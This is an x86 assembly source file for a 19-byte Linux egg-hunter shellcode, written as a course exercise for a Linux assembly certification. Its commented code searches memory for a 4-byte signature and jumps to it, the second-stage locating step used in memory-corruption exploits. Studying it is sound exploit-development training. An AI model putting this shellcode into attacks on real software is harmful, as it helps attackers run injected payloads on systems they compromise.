; Title: Linux x86 Egg Hunter Shellcode (19 bytes)
; Date: 4 August 2015
; Author: Guillaume Kaddouch
; SLAE-681
; Tested on: Ubuntu 14.04.2 LTS x86, Kali Linux 1.0.9 x86

; This code was created as an exercise for the SecurityTube Linux Assembly Expert (SLAE).

; Egg signature = 0x50905090 (push eax, nop, push eax, nop)
; Usually egg hunters use a 2 * 4 bytes (8 bytes) egg because the first address check could match the hardcoded egg signature in
; the egg hunter itself. As we do not store hardcoded egg signature below, it allows us to check only 4 bytes once.

global _start

section .text

_start:
	mov eax, addr			; retrieve a valid address (shorter than using JMP CALL POP)
	mov ebx, dword 0x5090508f	; egg signature altered: 0x50905090 - 1
	inc ebx				; fix egg signature in ebx (the purpose is to not store the hardcoded egg signature)

next_addr:
	inc eax				; increasing memory address to look at next address
	cmp dword [eax], ebx		; check if our egg is at that memory address, if yes set ZF = 1
	jne next_addr			; if ZF = 0 (check failed), then jump to next_addr to check next address
	jmp eax				; we found our egg (ZF = 1), jump at this address

	addr: db 0x1

